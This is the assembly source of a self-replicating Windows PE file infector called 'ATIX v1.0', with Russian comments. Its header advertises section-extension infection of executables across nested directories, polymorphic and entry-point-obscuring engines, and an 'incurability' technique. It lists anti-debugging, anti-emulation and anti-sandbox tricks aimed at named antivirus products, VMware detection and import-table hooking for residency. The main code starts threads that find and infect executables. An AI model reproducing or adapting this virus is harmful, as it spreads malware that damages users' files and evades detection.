;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;           
;                                                                                                        ; 
;																										 ;
;																										 ;    
;                xx  xxxxxxxx     xxxxxxxxxxxx xxx     xx     xxxxxxxx                         			 ;   
;              xxxxxxxxxxxxxxx    xxx xxxxxxx         xxxx    x xxxxxx xxxxxxx                 			 ;   
;               xxx       xxxx                        xxxx         xxx xxxxxxxx                			 ;   
;               xxx       xx x                        xxxx         xxx xxx                     			 ;   
;               xxx       xxxx          xxxx          xxxx         xxx xxx                     			 ;  
;              xxxx  x    x xx          xxxx          xxxx         xxx                         			 ;            
;              xxxx  x x  xxxx          xxxx          xxx                                      			 ;     
;              xxxx  xx   xxxx          xxx                        xxx  xx                     			 ;              
;              xxxx       xxxx          xxxx                       xxx xxx                     			 ;          
;              xxxx       xx x          xxxx          xxxx    xxxx xxx xxx                     			 ;               
;                xx       xxxx           xxx          xxxx    xxxxxxxx xxxxxxx                 			 ;                   
;               xxx       xxxx          xxxx           xxx               xxxxxx                			 ;                 
;                                                                                                        ;
;                                                                                                        ; 
;                                                                                                        ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;  
;																										 ; 
;										:)!																 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;																										 ;
;									 VIRUS ATIX														 	 ;
;																										 ; 
;										v1.0 															 ; 
;																										 ; 
;									   МУЛЬКИ:															 ; 
;																										 ; 
;																										 ;
;[+] инфект:			infect.asm 																		 ;
;						(+) exe-шек: 																	 ; 
;										(+) расширением последней секции								 ; 
;										(+) расширением предпоследней секции :)! 						 ;  
;											(если последняя секция .rsrc, то она пересобирается и 		 ; 
;											 и сдвигается вперед, и инфект происходит в предпоследнюю 	 ; 
;											 секцию) - так можно двигать много что 						 ;  
;						(+) возможно, что последняя секция не заинфекчена и не содержит флага на запись  ; 
;						(+) файлов и с оверлеем 														 ;
;						(+) в текущей и во всех вложенных директориях (стоит счетчик) 					 ; 
;						(+) не изменяются атрибуты файла												 ; 
;						(+) не изменяется дата последней модификации файла								 ; 
;						(+) проверка файлов SfcIsFileProtected											 ; 
;						(+) корректировка CheckSum файла 												 ; 
;							(если CheckSum изначально был =0, то он таким и остается) 					 ; 
;						(+) проверка на наличие и обнуление флагов										 ; 
;							IMAGE_DLLCHARACTERISTICS_NO_SEH & IMAGE_DLLCHARACTERISTICS_NX_COMPAT, 		 ; 
;							а также обнуление директории LoadConfig 									 ; 
;						(+) etc																			 ; 
;																										 ; 
;[+] полиморфизм:		rang32.asm, xTG.asm, FiNE.asm, faka.asm  										 ; 
;						(+) гсч 																		 ; 
;						(+) генератор исполнимого мусора												 ; 
;						(+) + модуль генерации фэйковых апишек 											 ; 
;						(+) полиморфный движок (здесь и далее для всех движков подробности в сорцах) 	 ; 
;						(+) etc																			 ; 
;																										 ; 
;[+] UEP:				flea.asm (+ rang32.asm, + xTG.asm) 												 ; 
;						(+) гсч																			 ; 
;						(+) генератор исполнимого мусора												 ; 
;						(+) uep (уёб) движок															 ; 
;						(+) техника неизлечимости 														 ; 
;						(+) etc 																		 ; 
;																										 ; 
;[+] резидентность																						 ; 
;	 на																									 ; 
;	 процесс:			pprm.asm  																		 ; 
;						(+) модификация таблички импорта  												 ; 
;						(+) etc 																		 ; 
;																										 ; 
;[+] защита:			atix.asm, infect.asm, armour.asm  	  											 ; 
;						(+) антиотладка																	 ; 
;						(+) антиэвристика																 ; 
;						(+) антиэмулька																	 ; 
;						(+) anti-sandbox																 ; 
;						(+) detect bpx 																	 ;   
;						(+) etc 																		 ; 
;																										 ; 
;[+] полезная нагрузка:	payload.asm																		 ; 
;						(+) вызов мессаги																 ; 
;						(+) etc 																		 ; 
;																										 ; 
;[+] другие фичи:		etc 																			 ; 
;						(+) юзается дельта-смещение 													 ;
;						(+) поиск кернела32 через PEB													 ;
;						(+) поиск адресов апишек путем сравнения хэшей от имен							 ;
;						(+) мультитредность и мультифиберность											 ;
;						(+)	метка есть в области конца предпоследней/последней секции жерты, 			 ; 
;							она (метка) расположена всегда в разных адресах и 							 ;
;							она (метка) всегда разная для каждой жертвы.                             	 ; 
;						(+) CRC32 and other CalcHash													 ; 
;						(+) адреса нужных вирусу апишек не сохраняются, всегда вычисляются заново 		 ; 
;							(в дальнейшем можно сделать классный разброс + мутация само собой)			 ; 
;						(+) etc 																		 ; 
;																										 ; 
;[+] тесты на ОС:																						 ; 
;						(+) Windows (x86): 2000, XP SP2/SP3, W7, VISTA.									 ;
;							Windows (x64): W7* (* - убрать или скорректировать антиэмульку)  			 ; 
;							! на других не тестилось													 ; 
;																										 ; 
;[-] :																									 ; 
;						(-) куски кода дублируются из-за движков. При желании можно от этого избавиться. ; 
;							Вирус был написан в 1-ую очередь для теста движков, а после для юзания 		 ; 
;							других фич. 																 ; 
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;																										 ; 
;спасибо izee, tlo. EOF и другим приветы :)!															 ;  
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ; 
;						вирмэйкинг для себя...искусство вечно											 ; 
;																										 ;  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
               



												;m1x
											;pr0mix@mail.ru
										;EOF
										 



				   

		    


.386
.model flat,stdcall
option	casemap:none

include windows.inc
include	kernel32.inc

includelib kernel32.lib





;========================================================================================================
;вспомогательный макрос для получения адреса строки без юзания всяких херей 
;========================================================================================================
pushsz	macro	szString:VARARG
	local	m1
	call	m1
	db		szString,0
	m1:
	endm
;======================================================================================================== 	  





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;ПОЕХАЛИ! 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
.code
xStart:
	assume	fs:flat 
	jmp		_xxx_ 





;========================================================================================================
;подключение движков/модулей/etc 
;========================================================================================================
inc_table:
include		xBase.asm							;модуль базовый функций (нахождение кернела, crc32 etc)
include		search.asm							;модуль поиска exe-шек   
include		rersrc.asm                             
include		infect.asm							;модуль инфекта exe-шек     
include		payload.asm							;модуль полезной нагрузки (вызов мессаги)       
include		armour.asm							;антиотладка и прочее (не все)  
include		rang32.asm							;гсч 
;include		faka.asm						;данный модуль значит подключен уже в xTG (xTG.asm) (генерация фэйковых апишек)   
include		xTG.asm								;генератор исполнимого мусора 
include		FinE.asm							;полиморфный движок     
include		flea.asm							;уеп (уёб) движок
include		pprm.asm							;модуль пер-процессной резидентности 
;========================================================================================================



	     

;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;функция xPPRMFunc
;резидентная функа (вызывается перед похученной апишкой)
;берет путь, преобразует его в путь + маска и ищет по данному пути файлы и инфектит их 
;ВХОД (stdcall) (xPPRMFunc(char *pszPath)):
;	pszPath - какой-то параметр, в данном случае путь к файлу/папке (+ возможная маска в пути) 
;ВЫХОД:
;	(+) инфект по файлов по пути :)! + передача управления жертве 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
xPPRMFunc:          
	pushad
	mov		esi,dword ptr [esp+24h]				;ESI - строка  
	sub		esp,(MAX_PATH + 4) 
	mov		edi,esp
	call	GetDelta							;получим дельта-смещение   
	lea		ecx,dword ptr [xsehhandler+eax]
	push	ecx
	xor		edx,edx
	push	dword ptr fs:[edx]
	mov		dword ptr fs:[edx],esp				;ставим еще один наш обработчик исключения   
	lea		edx,dword ptr [Infect+eax] 
	push	4  
	call	RANG32								;случайным образом определим кол-во файлов, которые в случае нахождения заинфектим 
	inc		eax									;один точно :)!   

	push	edx									;функция инфекта  
	push	eax									;кол-во файлов для инфекта     
	pushsz	'\*.*'								;маска    
	push	edi									;+ путь   

	push	esi
	call	xstrlen
	mov		ecx,eax  
	cld
	rep		movsb								;скопируем строку в свой буфер (в стэке)       
	dec		edi
	xchg	eax,ecx
	mov		al,'\'
	std
	repne	scasb								;обрежем все лишнее (маску/имя/etc) 
	cld  
	inc		edi  
	and		byte ptr [edi],0     
	call	FindPE								;и вызываем функу поиска ( + Infect) файлов по маске  
	add		esp,(MAX_PATH + 4)          
	xor		eax,eax
	pop		dword ptr fs:[eax]
	pop		eax 
	popad
	ret		4 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;конец функции xPPRMFunc 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 


                     


;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;функа xThreadFunc1 
;функция для 1-го трэда (в качестве параметра передаем дельта-смещение)
;данная функа ищет экзэшки и инфектит их 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
xThreadFunc1:
	pushad
	mov		ebp,esp 
	mov		esi,dword ptr [ebp+24h] 
	lea		ecx,dword ptr [xsehhandler+esi]
	push	ecx
	xor		edx,edx
	push	dword ptr fs:[edx]
	mov		dword ptr fs:[edx],esp				;ставим еще один наш обработчик исключения   
	mov		eax,MAX_LEN  
	sub		esp,eax
	mov		ebx,esp  
	push	esp
	push	eax 
	call	xGetCurrentDirectoryA1				;получаем текующую директорию 
	    
	lea		eax,dword ptr [OEP+esi]
	push	dword ptr [eax]						;сохраняем нашу OEP 
	push	eax 

	lea		eax,dword ptr [Infect+esi]   
	push	eax 
	push	4   
	pushsz	'\*.*'   
	push	ebx 
	call	FindPE								;вызываем функу поиска exeшек,         
	pop		ecx									;если они будут найдены - то переданная в качестве параметра функа Infect заинфектит их   
	pop		dword ptr [ecx]						;восстанавливаем нашу OEP 

	add		esp,MAX_LEN
	xor		eax,eax
	pop		dword ptr fs:[eax]					;убираем наш обработчик исключения   
	pop		ecx     

	mov		dword ptr [ebp+1Ch],eax				;и выходим    
 	popad
 	ret		4
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;конец функи xThreadFunc1 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;функа xThreadFunc2 
;функция для 2-го трэда (в качестве параметра передаем дельта-смещение)
;данная функа мутит полезную нагрузку (вызов мессаги)
;здесь происходит конвертирование трэда в фибер, затем сохздание нового фибера и передача
;управления на этот новый фибер  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
xThreadFunc2:
	push	esi
	mov		esi,dword ptr [esp+08] 
	push	esi 
	call	xConvertThreadToFiber1				;конвертим трэд в фибер  

	lea		edx,dword ptr [xFiberFunc1 + esi]
	push	esi
	push	edx
	push	00h 
	call	xCreateFiber1						;создаем новый фибер 

 	push	eax
 	call	xSwitchToFiber1						;и передаем на него управление  

 	call	esi									;этот код никогда не выполнится, т.к. новый фибер убъет этот фибер и себя (команда ret) 
 	ret  
	;pop		esi  
	;xor		eax,eax 
	;ret		4
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;конец функи xThreadFunc2 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;функа xThreadFunc3    
;функция для 3-го трэда (в качестве параметра передаем дельта-смещение)
;данная функа выполняет дополнительную антиотладку :)!  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
xThreadFunc3:
	call	regSS
	call	xIsDebuggerPresent
	call	xNtGlobalFlag 
	xor		eax,eax
	ret		4 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;конец функи xThreadFunc3 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;функа xFiberFunc1
;функа для нового созданного (2-ого) фибера
;вызов мессаги (полезная нагрузка) 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xFiberFunc1: 
	pushsz	'atix greets you :)!'  
	call	MsgBox 
	ret 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;конец функи xFiberFunc1 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 

  

	
 
;========================================================================================================
;продолжение работы ЗВЕРЬКА 
;======================================================================================================== 
_xxx_:  
	cld       
;-------------------------------------------------------------------------------------------------------- 
	call	GetDelta
	xchg	eax,esi
	lea		ecx,dword ptr [xsehhandler+esi]
	push	ecx
	xor		edx,edx
	push	dword ptr fs:[edx]
	mov		dword ptr fs:[edx],esp				;ставим наш обработчик исключения 
	push	ds									;и генерим исключение 
;########################################################################################################
;вот этот код закоментить для x64 - так как для них - действие противоположное:
;x86:
;	ds=0x30 - обработчик
;	ds=0x40 - нормулька
;x64:
;	ds=0x30 - нормулька
;	ds=0x40 - обработчик 
;######################################################################################################## 
	mov		dx,30h								;данный код представляет собой антиотладку + антиэмуляцию от каспера 2010 (и возможно более ранних версий) & Bitdefender'a (возможно кого-то еще из других авэ)  
	db		08Eh,0DAh							;mov	ds,dx
	ret
;-------------------------------------------------------------------------------------------------------- 
	add		dl,10h								;EDX = 40h  
	mov		ds,dx								;еще одна антиэмулька, на этот раз от OneCare + каспер 2010 (возможно кто-то еще из ав идет на хуй)  	
;######################################################################################################## 
	pop		ds 
;-------------------------------------------------------------------------------------------------------- 	 
ivmwp_magic:									;детект vmware    
	mov		eax,564D5868h   					;backdoor ; магический номер  
	push	0Ah									;номер команды - определение версии 
	pop		ecx									;передаем - backdoor-команду на выполнение        
	mov		edx,5658h							;магический порт бэкдор-интерфейса 
	xor		ebx,ebx                                    
_bdc_:  
	in		eax,dx								;вызываем команду 
	cmp		ebx,564D5868h						;если это варька, то отреагируем на это 
	jne		_otherf1_                            
	pushsz	'vmware magic port //xuita'     
	call	MsgBox
SizeVMh1	equ	$ - _bdc_	     
;-------------------------------------------------------------------------------------------------------- 	
;======================================================================================================== 
_otherf1_:										;здесь создадим 3 потока 	
	xor		edi,edi 
	lea		ecx,dword ptr [esp-12]  
	lea		edx,dword ptr [xThreadFunc1 + esi]
	push	ecx
	push	edi
	push	esi
	push	edx
	push	edi             
	push	edi  
	call	xCreateThread1						;1-ый поток для поиска и инфекта файлов  
	push	eax
;-------------------------------------------------------------------------------------------------------- 	
	lea		ecx,dword ptr [esp-16]
	lea		edx,dword ptr [xThreadFunc2 + esi]
	push	ecx
	push	edi
	push	esi
	push	edx
	push	edi
	push	edi
	call	xCreateThread1						;2-ой поток для полезной нагрузки (вызов мессаги) 
	push	eax 								;после 2-ой поток сконвертируется в фибер и создаст новый фибер :)! 
;-------------------------------------------------------------------------------------------------------- 
	lea		ecx,dword ptr [esp-20]
	lea		edx,dword ptr [xThreadFunc3 + esi]
	push	ecx
	push	edi
	push	esi
	push	edx             
	push	edi
	push	edi
	call	xCreateThread1						;3-ий поток для дополнительной антиотладки 
	push	eax 
	mov		eax,esp  
;--------------------------------------------------------------------------------------------------------
	push	INFINITE  
	push	01h
	push	eax          
	push	03h									;сколько потоков ждать? 
	call	xWaitForMultipleObjects1			;ждем, когда все порожденные (кроме основного) потоки отработают    
;-------------------------------------------------------------------------------------------------------- 
	call	xCloseHandle1						;и закрываем хэндлы наших потоков 
	call	xCloseHandle1 
	call	xCloseHandle1 
;======================================================================================================== 
;-------------------------------------------------------------------------------------------------------- 	 
	xor		eax,eax								;снимаем ранее поставленный наш обработчик исключения 
	pop		dword ptr fs:[eax]
	pop		eax 
;-------------------------------------------------------------------------------------------------------- 	 
	test	esi,esi								;это 1-ое поколение?
	je		_1gen_  
;-------------------------------------------------------------------------------------------------------- 	         
	mov		edi,dword ptr fs:[30h]
	mov		edi,dword ptr [edi+08]				;EDI = ImageBase 	
	mov		ebx,edi   
	assume	edi:ptr IMAGE_DOS_HEADER
	add		edi,[edi].e_lfanew
	assume	edi:ptr IMAGE_NT_HEADERS 
	movzx	ecx,[edi].FileHeader.NumberOfSections  
	dec		ecx
	imul	ecx,ecx,sizeof (IMAGE_SECTION_HEADER) 
	movzx	edx,[edi].FileHeader.SizeOfOptionalHeader
	lea		edx,dword ptr [edi + 4 + sizeof (IMAGE_FILE_HEADER) + edx]
	assume	edx:ptr IMAGE_SECTION_HEADER 
	add		edx,ecx								;переместимся в последнюю секцию (в табличке секций)
	cmp		dword ptr [edx].Name1,'rsr.'		;это секция ресурсов? 
	;jmp		_notmyrsrc_ 
	jne		_notmyrsrc_							;если нет, то перепрыгиваем дальше
		 										;иначе нам надо обнулить почти все тело зверька (так как возможно там были нули (возможно это секция данных),       
												;и если эти байты не обнулить, жертва после передачи ей управления может не заработать)
	mov		eax,dword ptr [esp]					;в стэке (после отработки уеп) у нас адрес за call'ом, который передает управление уже декриптору					  
	push	edi 
	sub		eax,6								;сдвигаемся на 6 байт (у нас конструкция такая в кодовой секции: mov reg32,<address>   call reg32 - так вот у нас адрес за этим колом,         
	mov		edi,dword ptr [eax]					;а нам нужно значение <address>, поэтому мы и сдвигаемся на 6 байт назад) 	
	push	esi
	push	edi
	push	PAGE_READWRITE 
	push	MEM_RESERVE+MEM_COMMIT 
	push	VSIZE2 	  
	push	0
	call	xVirtualAlloc1						;выделим виртуальную память для копирования части вируса (так как код в этом месте мы будем обнулять) 
	xchg	eax,edi  
	lea		esi,[inc_table + esi]				;скопируем все движки и модули, а также необходмую для дальнейшей работы часть тела вируса  
	mov		ecx,VSIZE2
	push	edi     
	rep		movsb            
	pop		edx 
	add		edx,P2SIZE							;EDX = адрес в выделенном буфере, с которого начнем выполняться   				 
	pop		edi 
	pop		esi 
_clear_end_:
	lea		ecx,dword ptr [_clear_end_ + esi]	;теперь здесь затрем почти все тело вируса    
	sub		ecx,edi       
	xor		eax,eax 
	rep		stosb								;и обнуляем эти байты   
	pop		edi 

	jmp		edx									;а после прыгаем дальше на выполнение :)! (на код в новом буфере)      

part2: 
P2SIZE		equ	$ - inc_table 
	call	GetDelta							;вот этот код (и дальше) будет выполнен уже в новом выделенном буфере (этот код туда скопирован, а здесь он будет затерт) 
	xchg	eax,esi 
;-------------------------------------------------------------------------------------------------------- 
_notmyrsrc_: 
	lea		ecx,dword ptr [esp-04]   
	push	ecx
	push	PAGE_READWRITE
	push	[edi].OptionalHeader.SizeOfImage 
	push	ebx                
	call	xVirtualProtect1					;разрешим запись 

	call	FLEA_RESTBYTES						;восстановим ранее сохраненные байты     
             
	push	eax 
	call	FLEA_RESTSTACK						;восстановим стэк   

	lea		eax,dword ptr [MsgBox+esi] ;[xPPRMFunc+esi] ;[MsgBox+esi] 
	push	ebx 
	push	eax         
	call	PPRM								;перехватим нужные нам апишки 
	 
	push	12345678h 
	OEP		= dword ptr $-4						;здесь хранится наш OEP 	       
_1gen_: 	
	ret											;поехали:)! 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;вот такие помидоры  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





;========================================================================================================
;const 
;======================================================================================================== 
MAX_LEN			equ		10Ch					;размер буфера для строк и прочего 
SIZE_WFD		equ		144h					;размер буфера под структуру WIN32_FIND_DATA  

VIRUS_SIZE		equ		$ - xStart				;размер зверька  
VSIZE2			equ		$ - inc_table
MAX_FINE_SIZE	equ		50000h					;максимальный размер буфера для создания полиморфа (декриптор + шифрованный код и т.п.)        		
;========================================================================================================


	push	0
	call	ExitProcess 

end		xStart


;Будь сильным - слабым всегда не везет! 
 


